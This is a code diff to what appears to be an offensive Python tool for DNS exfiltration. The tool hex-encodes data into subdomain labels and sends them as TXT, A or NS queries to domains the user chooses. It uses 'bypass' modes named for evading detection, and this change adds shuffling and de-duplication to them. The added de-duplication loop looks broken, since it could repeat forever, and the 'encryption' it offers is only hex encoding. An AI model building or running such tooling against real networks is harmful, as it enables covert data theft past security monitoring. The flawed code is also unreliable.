@@ -1,8 +1,8 @@
 ########################################################################################
 #author: @mel4mi
-#version: 1.0
+#version: 1.1
 #description: This script is a simple data sender script that sends data to subdomains
-#date: 2024-10-??
+#date: 2024-12-12
 ########################################################################################
 import os
 import subprocess
@@ -69,6 +69,7 @@ def xxd_encoder(data):
 def low_bypass(data):
     hex_data = binascii.hexlify(data.encode()).decode('utf-8')
     subdomains = ['mail', 'www']
+    random.shuffle(subdomains)
     formatted_hex = '\n'.join([f"{subdomains[i % len(subdomains)]}{hex_data[i:i+16]}" for i in range(0, len(hex_data), 16)])
     return formatted_hex
 
@@ -78,11 +79,19 @@ def medium_bypass(data, max_length=63): # you can change the max_length value, m
     parts = formatted_hex.split('\n')
     
     subdomains = []
+    used_subdomains = set()
     for part in parts:
         subdomain = f"mail{part[:max_length - 14]}dashboard{part[max_length - 14:]}www"        
         if len(subdomain) > max_length:
             subdomain = subdomain[:max_length]
         
+        while subdomain in used_subdomains:
+            random.shuffle(subdomains)
+            subdomain = f"mail{part[:max_length - 14]}dashboard{part[max_length - 14:]}www"
+            if len(subdomain) > max_length:
+                subdomain = subdomain[:max_length]
+        
+        used_subdomains.add(subdomain)
         subdomains.append(subdomain)
 
     return subdomains
@@ -175,9 +184,9 @@ if __name__ == '__main__':
     signal.signal(signal.SIGINT, signal_handler)
     
     parser = argparse.ArgumentParser(description='Subdomain Data Query Script')
-    parser.add_argument('--domains', nargs='+', required=True, help='List of domains to distribute data across')
-    parser.add_argument('--encryption', choices=['xxd', 'low_bypass', 'medium_bypass'], required=True, help='Encryption method to use')
-    parser.add_argument('--mode', choices=['TXT', 'A', 'NS', 'RANDOM'], default='TXT', help='Query mode')
+    parser.add_argument('-d', '--domains', nargs='+', required=True, help='List of domains to distribute data across')
+    parser.add_argument('-e', '--encryption', choices=['xxd', 'low_bypass', 'medium_bypass'], required=True, help='Encryption method to use')
+    parser.add_argument('-m', '--mode', choices=['TXT', 'A', 'NS', 'RANDOM'], default='TXT', help='Query mode')
     
     try:
         args = parser.parse_args()
